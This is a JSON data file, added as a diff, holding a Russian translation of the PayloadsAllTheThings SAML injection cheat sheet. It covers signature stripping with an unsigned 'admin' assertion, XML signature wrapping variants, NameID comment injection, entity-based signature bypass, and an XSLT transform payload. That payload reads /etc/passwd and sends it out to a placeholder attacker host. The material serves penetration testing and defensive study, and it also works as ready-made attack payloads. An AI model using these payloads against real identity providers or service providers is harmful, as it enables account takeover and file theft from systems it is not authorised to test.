@@ -1,0 +1,183 @@
+{
+  "category": "SAML Injection",
+  "source": "PayloadsAllTheThings/SAML Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое SAML SSO и где искать",
+      "language": "text",
+      "tags": ["methodology", "saml", "sso", "recon"],
+      "body": "SAML (Security Assertion Markup Language) — открытый стандарт обмена данными аутентификации и авторизации между сторонами, прежде всего между Identity Provider (IdP) и Service Provider (SP). Широко применяется для single sign-on (SSO). Уязвимости возникают из-за неверной реализации или конфигурации.\n\nГде искать:\n• Перехватывай поток SSO в Burp/ZAP: ищи параметры SAMLRequest и SAMLResponse (обычно base64, иногда + DEFLATE).\n• SAML Response должен содержать элемент <samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\".\n• Точка приёма (ACS, Assertion Consumer Service) на стороне SP — например /saml2/sp/acs/post — куда летит подписанная assertion.\n• Ключевые места атак: подпись (ds:Signature), Assertion, Subject/NameID, Conditions, AttributeValue."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Чек-лист техник атаки на SAML",
+      "language": "text",
+      "tags": ["methodology", "checklist"],
+      "body": "1. Invalid Signature — подпись не от настоящего CA (self-signed) → клонируй сертификат или подставь свой.\n2. Signature Stripping — выкинь блок подписи: при дефолтной конфигурации проверка подписи может вообще не выполняться.\n3. XML Signature Wrapping (XSW) — добавь клонированную неподписанную assertion/response рядом с легитимной подписанной.\n4. XML Comment Handling — вставь комментарий внутрь NameID, чтобы сломать парсинг username.\n5. XML External Entity (XXE) — через XML-сущности подмени значение, не меняя подписанный контент.\n6. XSLT — выполни преобразование через элемент transform (чтение файлов, SSRF).\nТулзы: SAML Raider, XSW Burp extension, ZAP SAML Support."
+    },
+    {
+      "subcategory": "Невалидная подпись",
+      "title": "Invalid Signature — клонирование self-signed сертификата",
+      "language": "text",
+      "tags": ["signature", "certificate", "clone"],
+      "body": "Подписи, которые подписаны не настоящим CA, подвержены клонированию. Убедись, что подпись выполнена настоящим CA. Если сертификат самоподписанный (self-signed), его можно склонировать или создать собственный self-signed сертификат и заменить им оригинальный — после чего подписать подменённую assertion своим ключом."
+    },
+    {
+      "subcategory": "Удаление подписи (Signature Stripping)",
+      "title": "Signature Stripping — суть атаки",
+      "language": "text",
+      "tags": ["signature-stripping", "bypass"],
+      "body": "«[...] принимать неподписанные SAML-assertion — это принимать имя пользователя без проверки пароля» — @ilektrojohn\n\nЦель — сформировать корректно построенную SAML Assertion и НЕ подписывать её. При некоторых дефолтных конфигурациях, если секция подписи опущена в SAML response, проверка подписи не выполняется вовсе."
+    },
+    {
+      "subcategory": "Удаление подписи (Signature Stripping)",
+      "title": "Пример: assertion с NameID=admin без подписи",
+      "language": "xml",
+      "tags": ["signature-stripping", "assertion", "nameid"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\" ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">\n    <saml2:Issuer xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer>\n    <saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n        <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" />\n    </saml2p:Status>\n    <saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">\n        <saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer>\n        <saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n            <saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID>\n            <saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n                <saml2:SubjectConfirmationData NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" />\n            </saml2:SubjectConfirmation>\n        </saml2:Subject>\n        <saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n            <saml2:AudienceRestriction>\n                <saml2:Audience>WLS_SP</saml2:Audience>\n            </saml2:AudienceRestriction>\n        </saml2:Conditions>\n        <saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\" SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n            <saml2:AuthnContext>\n                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>\n            </saml2:AuthnContext>\n        </saml2:AuthnStatement>\n    </saml2:Assertion>\n</saml2p:Response>"
+    },
+    {
+      "subcategory": "XML Signature Wrapping (XSW)",
+      "title": "XSW — суть атаки",
+      "language": "text",
+      "tags": ["xsw", "signature-wrapping", "assertion"],
+      "body": "Атака XML Signature Wrapping (XSW): некоторые реализации проверяют валидную подпись и сопоставляют её с валидной assertion, но не проверяют наличие нескольких assertion, нескольких подписей или ведут себя по-разному в зависимости от порядка assertion. Идея — добавить клонированную НЕподписанную копию рядом с легитимной подписанной, и заставить SP обработать именно подделку."
+    },
+    {
+      "subcategory": "XML Signature Wrapping (XSW)",
+      "title": "Варианты XSW1–XSW8",
+      "language": "table",
+      "tags": ["xsw", "signature-wrapping", "variants"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Вариант", "Применяется к", "Описание"],
+          "rows": [
+            ["XSW1", "SAML Response", "Добавить клонированную неподписанную копию Response ПОСЛЕ существующей подписи."],
+            ["XSW2", "SAML Response", "Добавить клонированную неподписанную копию Response ДО существующей подписи."],
+            ["XSW3", "SAML Assertion", "Добавить клонированную неподписанную копию Assertion ПЕРЕД существующей Assertion."],
+            ["XSW4", "SAML Assertion", "Добавить клонированную неподписанную копию Assertion ВНУТРЬ существующей Assertion."],
+            ["XSW5", "SAML Assertion", "Изменить значение в подписанной копии Assertion и добавить копию оригинальной Assertion с удалённой подписью в КОНЕЦ SAML-сообщения."],
+            ["XSW6", "SAML Assertion", "Изменить значение в подписанной копии Assertion и добавить копию оригинальной Assertion с удалённой подписью ПОСЛЕ оригинальной подписи."],
+            ["XSW7", "SAML Assertion", "Добавить блок «Extensions» с клонированной неподписанной assertion."],
+            ["XSW8", "SAML Assertion", "Добавить блок «Object», содержащий копию оригинальной assertion с удалённой подписью."]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "XML Signature Wrapping (XSW)",
+      "title": "Пример структуры XSW (FA / LA / LAS)",
+      "language": "xml",
+      "tags": ["xsw", "signature-wrapping", "poc"],
+      "body": "<SAMLResponse>\n  <FA ID=\"evil\">\n      <Subject>Attacker</Subject>\n  </FA>\n  <LA ID=\"legitimate\">\n      <Subject>Legitimate User</Subject>\n      <LAS>\n         <Reference Reference URI=\"legitimate\">\n         </Reference>\n      </LAS>\n  </LA>\n</SAMLResponse>"
+    },
+    {
+      "subcategory": "XML Signature Wrapping (XSW)",
+      "title": "Обозначения и эффект (на примере GitHub Enterprise)",
+      "language": "text",
+      "tags": ["xsw", "notes"],
+      "body": "В примере выше используются обозначения:\n• FA — Forged Assertion (поддельная assertion)\n• LA — Legitimate Assertion (легитимная assertion)\n• LAS — Signature of the Legitimate Assertion (подпись легитимной assertion)\n\nВ уязвимости GitHub Enterprise такой запрос проходил проверку и создавал сессию для Attacker вместо Legitimate User — даже если FA не подписана."
+    },
+    {
+      "subcategory": "Инъекция комментария в NameID (XML Comment Handling)",
+      "title": "XML Comment Handling — суть и затронутые CVE",
+      "language": "text",
+      "tags": ["comment-injection", "nameid", "cve"],
+      "body": "Злоумышленник, у которого уже есть аутентифицированный доступ в SSO, может аутентифицироваться от имени другого пользователя без его SSO-пароля. У этой уязвимости несколько CVE в разных библиотеках и продуктах:\n• OneLogin — python-saml — CVE-2017-11427\n• OneLogin — ruby-saml — CVE-2017-11428\n• Clever — saml2-js — CVE-2017-11429\n• OmniAuth-SAML — CVE-2017-11430\n• Shibboleth — CVE-2018-0489\n• Duo Network Gateway — CVE-2018-7340\n\nИсследователи заметили: если вставить комментарий внутрь поля username так, чтобы он «разрезал» username, атакующий может получить доступ к учётной записи легитимного пользователя."
+    },
+    {
+      "subcategory": "Инъекция комментария в NameID (XML Comment Handling)",
+      "title": "Иллюстрация уязвимости SAML-flaw",
+      "language": "image",
+      "tags": ["comment-injection", "nameid", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/saml-injection/SAML-xml-flaw.png",
+        "caption": "Схема обработки XML-комментария при разборе username в SAML: парсер обрезает значение NameID по комментарию, из-за чего user@user.com<!--...-->.evil.com интерпретируется как user@user.com. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Инъекция комментария в NameID (XML Comment Handling)",
+      "title": "Payload: комментарий внутри NameID",
+      "language": "xml",
+      "tags": ["comment-injection", "nameid", "payload"],
+      "body": "<SAMLResponse>\n    <Issuer>https://idp.com/</Issuer>\n    <Assertion ID=\"_id1234\">\n        <Subject>\n            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>"
+    },
+    {
+      "subcategory": "Инъекция комментария в NameID (XML Comment Handling)",
+      "title": "Как читается payload",
+      "language": "text",
+      "tags": ["comment-injection", "notes"],
+      "body": "Где user@user.com — первая часть username, а .evil.com — вторая. Из-за обработки комментария уязвимый парсер возвращает только user@user.com, и атакующий аутентифицируется как этот легитимный пользователь."
+    },
+    {
+      "subcategory": "XXE в SAMLResponse",
+      "title": "XML External Entity — суть атаки",
+      "language": "text",
+      "tags": ["xxe", "entity", "signature-bypass"],
+      "body": "Альтернативная эксплуатация — использовать XML-сущности (XML entities) для обхода проверки подписи, поскольку содержимое не изменяется, кроме момента парсинга XML.\n\nВ примере ниже:\n• &s; разрешится в строку \"s\"\n• &f1; разрешится в строку \"f1\""
+    },
+    {
+      "subcategory": "XXE в SAMLResponse",
+      "title": "Payload: XML-сущности в AttributeValue",
+      "language": "xml",
+      "tags": ["xxe", "entity", "payload"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE Response [\n  <!ENTITY s \"s\">\n  <!ENTITY f1 \"f1\">\n]>\n<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\n  Destination=\"https://idptestbed/Shibboleth.sso/SAML2/POST\"\n  ID=\"_04cfe67e596b7449d05755049ba9ec28\"\n  InResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\"\n  IssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\">\n[...]\n  <saml2:Attribute FriendlyName=\"uid\"\n    Name=\"urn:oid:0.9.2342.19200300.100.1.1\"\n    NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n    <saml2:AttributeValue>\n      &s;taf&f1;\n    </saml2:AttributeValue>\n  </saml2:Attribute>\n[...]\n</saml2p:Response>"
+    },
+    {
+      "subcategory": "XXE в SAMLResponse",
+      "title": "Результат",
+      "language": "text",
+      "tags": ["xxe", "notes"],
+      "body": "SAML response принимается Service Provider. Из-за уязвимости приложение SP сообщает значение \"taf\" как значение атрибута \"uid\" (то есть &s;taf&f1; склеилось в staff после раскрытия сущностей, но подписанный текст не менялся)."
+    },
+    {
+      "subcategory": "XSLT (Extensible Stylesheet Language Transformation)",
+      "title": "XSLT — суть атаки",
+      "language": "text",
+      "tags": ["xslt", "transform"],
+      "body": "XSLT-атаку можно выполнить с помощью элемента transform (ds:Transform внутри ds:Signature). Через подставленный xsl:stylesheet можно читать локальные файлы и выводить данные наружу (out-of-band / SSRF)."
+    },
+    {
+      "subcategory": "XSLT (Extensible Stylesheet Language Transformation)",
+      "title": "Схема XSLT-атаки",
+      "language": "image",
+      "tags": ["xslt", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/saml-injection/XSLT1.jpg",
+        "caption": "Схема XSLT-атаки в SAML: вредоносный xsl:stylesheet помещается в ds:Transform; при обработке подписи парсер выполняет преобразование, читая файл (например /etc/passwd) и отправляя его на сервер атакующего. Источник: http://sso-attacks.org/XSLT_Attack."
+      }
+    },
+    {
+      "subcategory": "XSLT (Extensible Stylesheet Language Transformation)",
+      "title": "Payload: XSLT в ds:Transform (чтение /etc/passwd → exfil)",
+      "language": "xml",
+      "tags": ["xslt", "file-read", "exfil"],
+      "body": "<ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n  ...\n    <ds:Transforms>\n      <ds:Transform>\n        <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n          <xsl:template match=\"doc\">\n            <xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/>\n            <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/>\n            <xsl:variable name=\"attackerUrl\" select=\"'http://[ATTACKER.DOMAIN.TLD]/'\"/>\n            <xsl:variable name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/>\n            <xsl:value-of select=\"unparsed-text($exploitUrl)\"/>\n          </xsl:template>\n        </xsl:stylesheet>\n      </ds:Transform>\n    </ds:Transforms>\n  ...\n</ds:Signature>"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "Инструменты для атаки на SAML",
+      "language": "table",
+      "tags": ["tools", "saml-raider", "burp"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Тулза", "Назначение"],
+          "rows": [
+            ["CompassSecurity/SAMLRaider", "Burp-расширение для SAML2."],
+            ["d0ge/XSW", "Burp Suite расширение для XML Signature Wrapping."],
+            ["ZAP Addon / SAML Support", "Позволяет детектировать, показывать, редактировать и фаззить SAML-запросы."]
+          ]
+        }
+      }
+    }
+  ]
+}
